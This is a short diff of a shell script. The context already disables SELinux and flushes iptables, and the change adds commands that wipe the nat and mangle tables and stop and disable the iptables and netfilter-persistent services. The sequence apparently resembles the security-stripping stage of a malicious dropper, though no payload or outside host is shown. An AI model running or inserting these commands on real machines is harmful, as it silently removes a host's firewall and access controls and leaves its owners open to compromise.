@@ -28,9 +28,16 @@ setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 iptables -F
 iptables -X
-iptables -A OUTPUT -p tcp --dport 13800 -j DROP
-iptables -A OUTPUT -p tcp --dport 13800 -j DROP
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
 service iptables reload
+sudo systemctl stop netfilter-persistent
+sudo systemctl disable netfilter-persistent
+sudo systemctl stop iptables
+sudo systemctl disable iptables
+
 
 # printing greetings
 # printing greetings
